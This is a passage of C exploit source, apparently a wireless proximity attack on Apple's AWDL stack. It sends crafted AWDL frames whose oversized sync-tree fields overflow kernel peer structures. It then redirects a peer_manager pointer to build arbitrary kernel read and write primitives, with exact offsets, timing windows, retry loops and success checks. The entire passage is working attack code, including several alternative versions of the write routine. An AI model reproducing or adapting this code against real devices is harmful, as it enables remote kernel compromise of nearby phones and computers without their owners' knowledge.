            AWDL(),
            SYNC_PARAMS(),
            SERV_PARAM(),
            HT_CAPS(),
            DATAPATH(aa_para.lower_peer_mac),
            SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
            PKT_END());
        if (has_bad_bytes) {
          goto restart_with_new_read;
        }

        uint8_t* updated_buf = arbitrary_read_fast(target_kaddr, len);

        printf("before:\n");
        hexdump(_original, len);
        printf("want to write:\n");
        hexdump(buf, len);
        printf("after:\n");
        hexdump(updated_buf, len);

        int worked = 0;
        if ((memcmp(updated_buf, buf, len)) != 0) {
          printf("they differ :(\n");
        } else {
          printf("bundled_write success!\n");
          worked = 1;
        }
        free(original);
        free(_original);
        free(updated_buf);
        free(arbitrary_write_buffer);
        return worked;
      }

      // if we're not at the end, still "restart" every N bytes because the write isn't all that reliable :(
      if (bytes_written == 16) {
        memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);
        inject(RT(),
            WIFI(aa_para.dst, aa_para.lower_peer_mac),
            AWDL(),
            SYNC_PARAMS(),
            SERV_PARAM(),
            HT_CAPS(),
            DATAPATH(aa_para.lower_peer_mac),
            SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
            PKT_END());
        goto restart_with_new_read;
      }
    }

abort_and_retry:
    printf("abort and retry\n");
  }
  return 0;
}

// lets just repeatidly write to the same target and try to repro the panic
int test_buffer_write() {
  uint64_t target_kaddr = aa_para.upper_peer_kaddr + 0x1780;


  refresh_peers();


  uint8_t timestamp_buf[0x60] = {0};
  *(uint64_t*)(timestamp_buf+0x40) = 0; // fake timestamp
  *(uint32_t*)(timestamp_buf+0x48) = 0; // n_frames_in_last_second

  // clear lower's last_frame timestamp and frames_in_last_second
  inject(RT(),
      WIFI(aa_para.dst, aa_para.lower_peer_mac),
      AWDL(),
      SYNC_PARAMS(),
      SERV_PARAM(),
      HT_CAPS(),
      DATAPATH(aa_para.lower_peer_mac),
      SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
      PKT_END());

  // lower now has a timestamp and count of 0
 
  // after we get the fast read going we start allocating a lot of new peers
  // (a new peer per read)
  // this means that, especially with the 5GHz list semantics, its possible we mess the list
  // up if we put the old LL pointers back.

  // to mitigate this, lets re-read the arbitrary_write_buffer if we need to.

  // reload the leak buffer:
  printf("reloading leak buffer\n");
  printf("before: 0x%016llx 0x%016llx\n", *(uint64_t*)(aa_para.leak+0x1bb+0x10), *(uint64_t*)(aa_para.leak+0x1bb+0x18));
  uint8_t* new_leak = arbitrary_read_fast(aa_para.lower_peer_kaddr + 0x1648 - 3, 0x32b); 
  memcpy(aa_para.leak, new_leak, 0x32b);
  printf("before: 0x%016llx 0x%016llx\n", *(uint64_t*)(aa_para.leak+0x1bb+0x10), *(uint64_t*)(aa_para.leak+0x1bb+0x18));
  free(new_leak);

  // leak buffer now has lower with a 0 timestamp

  printf("wkbuf_bundled, aa_para.leak\n");
  hexdump(aa_para.leak, 0x32b);

  uint8_t* arbitrary_write_buffer = malloc(0x340);
  memset(arbitrary_write_buffer, 0, 0x340);
  memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);

  size_t current_byte_offset = 0;

  uint64_t safety_window_nano = 50*1000*1000;

  uint32_t frame_cnt = 0;

  uint32_t bytes_written = 0;

  uint32_t offset = 0;

  while (1) {
    refresh_peers();
    // clear upper's last_frame timestamp
    inject(RT(),
        WIFI(aa_para.dst, aa_para.upper_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.upper_peer_mac),
        SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
        PKT_END());
    
    uint64_t timestamp_start = now_nanoseconds();

    // give upper a fresh timestamp:
    inject(RT(),
        WIFI(aa_para.dst, aa_para.upper_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.upper_peer_mac),
        PKT_END());
    
    // corrupt upper's peer_manager such that the add will bump up the n_frames_in_last_second field:
    *(uint64_t*)(arbitrary_write_buffer+0x1e3) = aa_para.upper_peer_kaddr+0x1693-0x7c80;

    // this will also reset lower's timestamp and cnt
    inject(RT(),
        WIFI(aa_para.dst, aa_para.lower_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.lower_peer_mac),
        SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
        PKT_END());

    int received = 0;
    do {
      if ((now_nanoseconds() - timestamp_start) > safety_window_nano) {
        printf("aborting arbitrary_write at checkpoint 1 (wkbuf_bundled)\n");
        goto abort_and_retry;
      }
      received = try_inject(RT(),
          WIFI(aa_para.dst, aa_para.upper_peer_mac),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          HT_CAPS(),
          DATAPATH(aa_para.upper_peer_mac),
          PKT_END());
    } while(!received);

    // upper now has a valid timestamp and large count

    while (1) {
      offset += 1;
      offset %= 0x40;
      uint64_t target_kaddr = aa_para.upper_peer_kaddr + 0x1780 + offset;
      *(uint64_t*)(arbitrary_write_buffer+0x1e3) = target_kaddr-0x7c80+current_byte_offset;
      inject(RT(),
         WIFI(aa_para.dst, aa_para.lower_peer_mac),
         AWDL(),
         SYNC_PARAMS(),
         SERV_PARAM(),
         HT_CAPS(),
         DATAPATH(aa_para.lower_peer_mac),
         SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
         PKT_END());

      uint16_t delta_val = 0x7f;
      // the target arbitrary_add: 
      do {
       uint64_t elapsed_nanos = now_nanoseconds() - timestamp_start;
       printf("arbitrary_add: %016ull nanos since start\n", elapsed_nanos);
       if (elapsed_nanos > safety_window_nano) {
         printf("aborting arbitrary_write at checkpoint 2 (wkbuf_bundled)\n");
         goto abort_and_retry;
       }
       received = try_inject(RT(),
         WIFI(aa_para.dst, aa_para.upper_peer_mac),
         AWDL(),
         SYNC_PARAMS(),
         SERV_PARAM(),
         TLV_IGN(delta_val-0x66),
         PKT_END());
      } while(!received);

      bytes_written++;
      printf("written %d bytes\n", bytes_written);
      printf("sent write for: 0x%016llx\n", target_kaddr);

      if (bytes_written == 10000) {
        printf("wrote 10000 bytes\n");
        inject(RT(),
            WIFI(aa_para.dst, aa_para.lower_peer_mac),
            AWDL(),
            SYNC_PARAMS(),
            SERV_PARAM(),
            HT_CAPS(),
            DATAPATH(aa_para.lower_peer_mac),
            SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
            PKT_END());
        return 0;
      }
    }

abort_and_retry:
    usleep(400*1000); // let stuff catch up...
    printf("abort and retry\n");
  }
  return 0;
}

#if 0
// needs arbitrary_read_fast
int wkbuf_bundled(uint64_t target_kaddr, uint8_t* buf, size_t len) {
  refresh_peers();

  uint8_t* _original = arbitrary_read_fast(target_kaddr, len);
  uint8_t* original = malloc(len+3);
  memset(original, 0, len+3);
  memcpy(original, _original, len+3);

  uint8_t timestamp_buf[0x60] = {0};
  *(uint64_t*)(timestamp_buf+0x40) = 0; // fake timestamp
  *(uint32_t*)(timestamp_buf+0x48) = 0; // n_frames_in_last_second

  // clear lower's last_frame timestamp and frames_in_last_second
  inject(RT(),
      WIFI(aa_para.dst, aa_para.lower_peer_mac),
      AWDL(),
      SYNC_PARAMS(),
      SERV_PARAM(),
      HT_CAPS(),
      DATAPATH(aa_para.lower_peer_mac),
      SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
      PKT_END());
  
  // lower will now have a fresh timestamp and count
  /*
  inject(RT(),
      WIFI(aa_para.dst, aa_para.lower_peer_mac),
      AWDL(),
      SYNC_PARAMS(),
      SERV_PARAM(),
      PKT_END());
  */
  // after we get the fast read going we start allocating a lot of new peers
  // (a new peer per read)
  // this means that, especially with the 5GHz list semantics, its possible we mess the list
  // up if we put the old LL pointers back.

  // to mitigate this, lets re-read the arbitrary_write_buffer if we need to.

  if (need_leak_buffer_reload) {
    printf("reloading leak buffer\n");
    printf("before: 0x%016llx 0x%016llx\n", *(uint64_t*)(aa_para.leak+0x1bb+0x10), *(uint64_t*)(aa_para.leak+0x1bb+0x18));
    uint8_t* new_leak = arbitrary_read_fast(aa_para.lower_peer_kaddr + 0x1648 - 3, 0x32b); 
    memcpy(aa_para.leak, new_leak, 0x32b);
    printf("before: 0x%016llx 0x%016llx\n", *(uint64_t*)(aa_para.leak+0x1bb+0x10), *(uint64_t*)(aa_para.leak+0x1bb+0x18));
    free(new_leak);
  }

  // leak buffer now has lower with a 0 timestamp

  printf("wkbuf_bundled, aa_para.leak\n");
  hexdump(aa_para.leak, 0x32b);

  uint8_t* arbitrary_write_buffer = malloc(0x340);
  memset(arbitrary_write_buffer, 0, 0x340);
  memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);

  size_t current_byte_offset = 0;

  uint64_t safety_window_nano = 600*1000*1000;

  uint32_t frame_cnt = 0;

  while (1) {
    // clear upper's last_frame timestamp
    inject(RT(),
        WIFI(aa_para.dst, aa_para.upper_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.upper_peer_mac),
        SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
        PKT_END());
    
    uint64_t timestamp_start = now_nanoseconds();

    // give upper a fresh timestamp:
    inject(RT(),
        WIFI(aa_para.dst, aa_para.upper_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        PKT_END());
    
    frame_cnt = 1;

    // corrupt upper's peer_manager such that the add will bump up the n_frames_in_last_second field:
    *(uint64_t*)(arbitrary_write_buffer+0x1e3) = aa_para.upper_peer_kaddr+0x1693-0x7c80;

    // this will also reset lower's timestamp and cnt
    inject(RT(),
        WIFI(aa_para.dst, aa_para.lower_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.lower_peer_mac),
        SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
        PKT_END());


    // send a packet to upper; we only need to bump the n_frames field up by at least 0x20, so no need to pad the frame:

    // make n_frames large so that next packet to upper fails safe

    int received = 0;
    do {
      // only continue if <800ms elapsed
      if ((now_nanoseconds() - timestamp_start) > safety_window_nano/*800*1000*1000*/) {
        // abort; need to fixup upper
        printf("aborting arbitrary_write at checkpoint 1 (wkbuf_bundled)\n");
        goto abort_and_retry;
      }
      received = try_inject(RT(),
          WIFI(aa_para.dst, aa_para.upper_peer_mac),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          PKT_END());
    } while(!received);

    frame_cnt++;

    // upper now has a valid timestamp and 

    while (1) {
      // keep this loop going as long as we can while staying inside the 800ms safety window
      // now corrupt upper's peer_manager again so that it points to the real arbitrary_add target:

      // this will again reset lower's cnt and timestamp to the values when the leak buffer was reloaded
      // this will also set lower's timestamp and cnt to 0
      *(uint64_t*)(arbitrary_write_buffer+0x1e3) = target_kaddr-0x7c80+current_byte_offset;
      inject(RT(),
         WIFI(aa_para.dst, aa_para.lower_peer_mac),
         AWDL(),
         SYNC_PARAMS(),
         SERV_PARAM(),
         HT_CAPS(),
         DATAPATH(aa_para.lower_peer_mac),
         SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
         PKT_END());

      uint8_t current_byte = original[current_byte_offset];
      uint8_t desired_byte = buf[current_byte_offset];
      uint8_t delta_byte = desired_byte - current_byte;
      uint16_t delta_val = delta_byte;

      // this can be 0x69?
      if (delta_val < 0x80) {
        delta_val += 0x100;
      }

      // the target arbitrary_add: 
      do {
       // only continue if <800ms elapsed
       if (((now_nanoseconds() - timestamp_start) > safety_window_nano) || (frame_cnt > 16)) {
         // abort; need to fixup upper
         printf("aborting arbitrary_write at checkpoint 2 (wkbuf_bundled)\n");
         if (frame_cnt > 16) {
            printf("aborting because frame cnt too large\n");
         }
         frame_cnt = 0;
         goto abort_and_retry;
       }
       received = try_inject(RT(),
         WIFI(aa_para.dst, aa_para.upper_peer_mac),
         AWDL(),
         SYNC_PARAMS(),
         SERV_PARAM(),
         TLV_IGN(delta_val-0x66),
         PKT_END());
      } while(!received);

      frame_cnt++;


/*


      // start new reset code,,,
      // what is this trying to do??
      // right, it's trying to reset the header state of upper
      memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);
      inject(RT(),
          WIFI(aa_para.dst, aa_para.lower_peer_mac),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          HT_CAPS(),
          DATAPATH(aa_para.lower_peer_mac),
          SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
          PKT_END());
      
      printf("reset??\n");

      // clear lower's last_frame timestamp and frames_in_last_second
      inject(RT(),
          WIFI(aa_para.dst, aa_para.lower_peer_mac),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          HT_CAPS(),
          DATAPATH(aa_para.lower_peer_mac),
          SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
          PKT_END());
      
      // give lower a fresh timestamp
      inject(RT(),
          WIFI(aa_para.dst, aa_para.lower_peer_mac),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          PKT_END());

      // clear upper's last_frame timestamp
      inject(RT(),
          WIFI(aa_para.dst, aa_para.upper_peer_mac),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          HT_CAPS(),
          DATAPATH(aa_para.upper_peer_mac),
          SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
          PKT_END());

      // give upper a fresh timestamp:
      inject(RT(),
          WIFI(aa_para.dst, aa_para.upper_peer_mac),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          PKT_END());
      
      // end new reset code


*/

      // apply the change to original too so the overflow is also visible:
      // (we added 3 to the size of the original buffer to account for this cast)
      *((uint32_t*)(original+current_byte_offset))+=((uint32_t)delta_val);

      current_byte_offset++;

      if (current_byte_offset == len) {
        // we're done:
        // fixup upper's peer_manager field:
        memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);
        inject(RT(),
            WIFI(aa_para.dst, aa_para.lower_peer_mac),
            AWDL(),
            SYNC_PARAMS(),
            SERV_PARAM(),
            HT_CAPS(),
            DATAPATH(aa_para.lower_peer_mac),
            SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
            PKT_END());
        printf("wkbuf_bundled done??\n");

        printf("resetting packet counts\n");
        /*
        inject(RT(),
            WIFI(aa_para.dst, aa_para.lower_peer_mac),
            AWDL(),
            SYNC_PARAMS(),
            SERV_PARAM(),
            HT_CAPS(),
            DATAPATH(aa_para.lower_peer_mac),
            SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
            PKT_END());
        */
        // clear upper's last_frame timestamp
        inject(RT(),
            WIFI(aa_para.dst, aa_para.upper_peer_mac),
            AWDL(),
            SYNC_PARAMS(),
            SERV_PARAM(),
            HT_CAPS(),
            DATAPATH(aa_para.upper_peer_mac),
            SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
            PKT_END());
        printf("done\n");
        // we should read the buffer back and check

        uint8_t* updated_buf = arbitrary_read_fast(target_kaddr, len);
        printf("before:\n");
        hexdump(_original, len);
        printf("want to write:\n");
        hexdump(buf, len);
        printf("after:\n");
        hexdump(updated_buf, len);

        int worked = 0;
        if ((memcmp(updated_buf, buf, len)) != 0) {
          printf("they differ :(\n");
        } else {
          printf("bundled_write success!\n");
          worked = 1;
        }
        free(original);
        free(_original);
        free(updated_buf);
        return worked;
      }
    }

abort_and_retry:
    // don't actually need to do this??
    // fixup upper's peer_manager field:
    /*
    printf("sending upper reset\n");
    memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);
    inject(RT(),
        WIFI(aa_para.dst, aa_para.lower_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.lower_peer_mac),
        SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
        PKT_END());
    printf("sent upper reset\n");  
    */
    printf("abort and retry\n");
  }

  // unreachable
  return 0;
}
#endif



#if 0
/* old one */
// needs arbitrary_read_fast
int wkbuf_bundled(uint64_t target_kaddr, uint8_t* buf, size_t len) {
  uint8_t* _original = arbitrary_read_fast(target_kaddr, len);
  uint8_t* original = malloc(len+3);
  memset(original, 0, len+3);
  memcpy(original, _original, len+3);

  // after we get the fast read going we start allocating a lot of new peers
  // (a new peer per read)
  // this means that, especially with the 5GHz list semantics, its possible we mess the list
  // up if we put the old LL pointers back.

  // to mitigate this, lets re-read the arbitrary_write_buffer if we need to.

  if (need_leak_buffer_reload) {
    printf("reloading leak buffer\n");
    printf("before: 0x%016llx 0x%016llx\n", *(uint64_t*)(aa_para.leak+0x1bb+0x10), *(uint64_t*)(aa_para.leak+0x1bb+0x18));
    uint8_t* new_leak = arbitrary_read_fast(aa_para.lower_peer_kaddr + 0x1648 - 3, 0x32b); 
    memcpy(aa_para.leak, new_leak, 0x32b);
    printf("before: 0x%016llx 0x%016llx\n", *(uint64_t*)(aa_para.leak+0x1bb+0x10), *(uint64_t*)(aa_para.leak+0x1bb+0x18));
    free(new_leak);
  }

  printf("wkbuf_bundled, aa_para.leak\n");
  hexdump(aa_para.leak, 0x32b);

  uint8_t* arbitrary_write_buffer = malloc(0x340);
  memset(arbitrary_write_buffer, 0, 0x340);
  memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);

  size_t current_byte_offset = 0;

  uint64_t safety_window_nano = 600*1000*1000;

  uint32_t frame_cnt = 0;

  while (1) {
  refresh_peers();

    uint8_t timestamp_buf[0x60] = {0};
    *(uint64_t*)(timestamp_buf+0x40) = 0; // fake timestamp
    *(uint32_t*)(timestamp_buf+0x48) = 0x4343; // n_frames_in_last_second
    
    // clear lower's last_frame timestamp and frames_in_last_second
    inject(RT(),
        WIFI(aa_para.dst, aa_para.lower_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.lower_peer_mac),
        SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
        PKT_END());
    
    inject(RT(),
        WIFI(aa_para.dst, aa_para.lower_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        PKT_END());

    // clear upper's last_frame timestamp
    inject(RT(),
        WIFI(aa_para.dst, aa_para.upper_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.upper_peer_mac),
        SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
        PKT_END());
    
    uint64_t timestamp_start = now_nanoseconds();

    // give upper a fresh timestamp:
    inject(RT(),
        WIFI(aa_para.dst, aa_para.upper_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        PKT_END());


    // corrupt upper's peer_manager such that the add will bump up the n_frames_in_last_second field:
    *(uint64_t*)(arbitrary_write_buffer+0x1e3) = aa_para.upper_peer_kaddr+0x1693-0x7c80;

    inject(RT(),
        WIFI(aa_para.dst, aa_para.lower_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.lower_peer_mac),
        SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
        PKT_END());

    frame_cnt++;

    // send a packet to upper; we only need to bump the n_frames field up by at least 0x20, so no need to pad the frame:

    // make n_frames large so that next packet to upper fails safe

    int received = 0;
    do {
      // only continue if <800ms elapsed
      if ((now_nanoseconds() - timestamp_start) > safety_window_nano/*800*1000*1000*/) {
        // abort; need to fixup upper
        printf("aborting arbitrary_write at checkpoint 1 (wkbuf_bundled)\n");
        goto abort_and_retry;
      }
      received = try_inject(RT(),
          WIFI(aa_para.dst, aa_para.upper_peer_mac),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          PKT_END());
    } while(!received);

    while (1) {
      // keep this loop going as long as we can while staying inside the 800ms safety window
      frame_cnt++;
      // now corrupt upper's peer_manager again so that it points to the real arbitrary_add target:

      // this will again reset lower's cnt and timestamp to the values when the leak buffer was reloaded
      *(uint64_t*)(arbitrary_write_buffer+0x1e3) = target_kaddr-0x7c80+current_byte_offset;
      inject(RT(),
         WIFI(aa_para.dst, aa_para.lower_peer_mac),
         AWDL(),
         SYNC_PARAMS(),
         SERV_PARAM(),
         HT_CAPS(),
         DATAPATH(aa_para.lower_peer_mac),
         SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
         PKT_END());

      uint8_t current_byte = original[current_byte_offset];
      uint8_t desired_byte = buf[current_byte_offset];
      uint8_t delta_byte = desired_byte - current_byte;
      uint16_t delta_val = delta_byte;

      // this can be 0x69?
      if (delta_val < 0x80) {
        delta_val += 0x100;
      }

      // the target arbitrary_add: 
      do {
       // only continue if <800ms elapsed
       if (((now_nanoseconds() - timestamp_start) > safety_window_nano) || (frame_cnt > 16)) {
         // abort; need to fixup upper
         printf("aborting arbitrary_write at checkpoint 2 (wkbuf_bundled)\n");
         if (frame_cnt > 16) {
            printf("aborting because frame cnt too large\n");
         }
         frame_cnt = 0;
         goto abort_and_retry;
       }
       received = try_inject(RT(),
         WIFI(aa_para.dst, aa_para.upper_peer_mac),
         AWDL(),
         SYNC_PARAMS(),
         SERV_PARAM(),
         TLV_IGN(delta_val-0x66),
         PKT_END());
      } while(!received);



      // start new reset code,,,
      // what is this trying to do??
      // right, it's trying to reset the header state of upper
      memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);
      inject(RT(),
          WIFI(aa_para.dst, aa_para.lower_peer_mac),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          HT_CAPS(),
          DATAPATH(aa_para.lower_peer_mac),
          SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
          PKT_END());
      
      printf("reset??\n");

      // clear lower's last_frame timestamp and frames_in_last_second
      inject(RT(),
          WIFI(aa_para.dst, aa_para.lower_peer_mac),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          HT_CAPS(),
          DATAPATH(aa_para.lower_peer_mac),
          SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
          PKT_END());
      
      // give lower a fresh timestamp
      inject(RT(),
          WIFI(aa_para.dst, aa_para.lower_peer_mac),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          PKT_END());

      // clear upper's last_frame timestamp
      inject(RT(),
          WIFI(aa_para.dst, aa_para.upper_peer_mac),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          HT_CAPS(),
          DATAPATH(aa_para.upper_peer_mac),
          SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
          PKT_END());

      // give upper a fresh timestamp:
      inject(RT(),
          WIFI(aa_para.dst, aa_para.upper_peer_mac),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          PKT_END());
      
      // end new reset code

      // apply the change to original too so the overflow is also visible:
      // (we added 3 to the size of the original buffer to account for this cast)
      *((uint32_t*)(original+current_byte_offset))+=((uint32_t)delta_val);

      current_byte_offset++;

      if (current_byte_offset == len) {
        // we're done:
        // fixup upper's peer_manager field:
        memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);
        inject(RT(),
            WIFI(aa_para.dst, aa_para.lower_peer_mac),
            AWDL(),
            SYNC_PARAMS(),
            SERV_PARAM(),
            HT_CAPS(),
            DATAPATH(aa_para.lower_peer_mac),
            SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
            PKT_END());
        printf("wkbuf_bundled done??\n");

        printf("resetting packet counts\n");
        inject(RT(),
            WIFI(aa_para.dst, aa_para.lower_peer_mac),
            AWDL(),
            SYNC_PARAMS(),
            SERV_PARAM(),
            HT_CAPS(),
            DATAPATH(aa_para.lower_peer_mac),
            SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
            PKT_END());

        // clear upper's last_frame timestamp
        inject(RT(),
            WIFI(aa_para.dst, aa_para.upper_peer_mac),
            AWDL(),
            SYNC_PARAMS(),
            SERV_PARAM(),
            HT_CAPS(),
            DATAPATH(aa_para.upper_peer_mac),
            SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
            PKT_END());
        printf("done\n");
        // we should read the buffer back and check

        uint8_t* updated_buf = arbitrary_read_fast(target_kaddr, len);
        printf("before:\n");
        hexdump(_original, len);
        printf("want to write:\n");
        hexdump(buf, len);
        printf("after:\n");
        hexdump(updated_buf, len);

        int worked = 0;
        if ((memcmp(updated_buf, buf, len)) != 0) {
          printf("they differ :(\n");
        } else {
          printf("bundled_write success!\n");
          worked = 1;
        }
        free(original);
        free(_original);
        free(updated_buf);
        return worked;
      }
    }

abort_and_retry:
    // don't actually need to do this??
    // fixup upper's peer_manager field:
    printf("sending upper reset\n");
    memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);
    inject(RT(),
        WIFI(aa_para.dst, aa_para.lower_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.lower_peer_mac),
        SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
        PKT_END());
    printf("sent upper reset\n");  
  }

  // unreachable
  return 0;
}
#endif


// needs arbitrary_read_fast
void wkbuf_bundled_noread(uint64_t target_kaddr, uint8_t* buf, size_t len, uint8_t* _original) {
  uint8_t* original = malloc(len+3);
  memset(original, 0, len+3);
  memcpy(original, _original, len+3);

  // after we get the fast read going we start allocating a lot of new peers
  // (a new peer per read)
  // this means that, especially with the 5GHz list semantics, its possible we mess the list
  // up if we put the old LL pointers back.

  // to mitigate this, lets re-read the arbitrary_write_buffer if we need to.

  if (need_leak_buffer_reload) {
    printf("reloading leak buffer\n");
    printf("before: 0x%016llx 0x%016llx\n", *(uint64_t*)(aa_para.leak+0x1bb+0x10), *(uint64_t*)(aa_para.leak+0x1bb+0x18));
    uint8_t* new_leak = arbitrary_read_fast(aa_para.lower_peer_kaddr + 0x1648 - 3, 0x32b); 
    memcpy(aa_para.leak, new_leak, 0x32b);
    printf("before: 0x%016llx 0x%016llx\n", *(uint64_t*)(aa_para.leak+0x1bb+0x10), *(uint64_t*)(aa_para.leak+0x1bb+0x18));
    free(new_leak);
  }

  uint8_t* arbitrary_write_buffer = malloc(0x340);
  memset(arbitrary_write_buffer, 0, 0x340);
  memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);

  size_t current_byte_offset = 0;

  while (1) {
    // clear upper's last_frame timestamp:
    uint8_t timestamp_buf[0x60] = {0};
    *(uint64_t*)(timestamp_buf+0x40) = 0; // fake timestamp
    *(uint32_t*)(timestamp_buf+0x48) = 0x4343; // n_frames_in_last_second

    inject(RT(),
        WIFI(aa_para.dst, aa_para.upper_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.upper_peer_mac),
        SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
        PKT_END());
    
    // give upper a fresh timestamp:
    inject(RT(),
        WIFI(aa_para.dst, aa_para.upper_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        PKT_END());

    uint64_t timestamp_start = now_nanoseconds();

    // corrupt upper's peer_manager such that the add will bump up the n_frames_in_last_second field:
    *(uint64_t*)(arbitrary_write_buffer+0x1e3) = aa_para.upper_peer_kaddr+0x1693-0x7c80;

    inject(RT(),
        WIFI(aa_para.dst, aa_para.lower_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.lower_peer_mac),
        SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
        PKT_END());

    // send a packet to upper; we only need to bump the n_frames field up by at least 0x20, so no need to pad the frame:
    int received = 0;
    do {
      // only continue if <800ms elapsed
      if (now_nanoseconds() - timestamp_start > 600*1000*1000) {
        // abort; need to fixup upper
        printf("aborting arbitrary_write at checkpoint 1 (noread)\n");
        goto abort_and_retry;
      }
      received = try_inject(RT(),
          WIFI(aa_para.dst, aa_para.upper_peer_mac),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          PKT_END());
    } while(!received);


    while (1) {
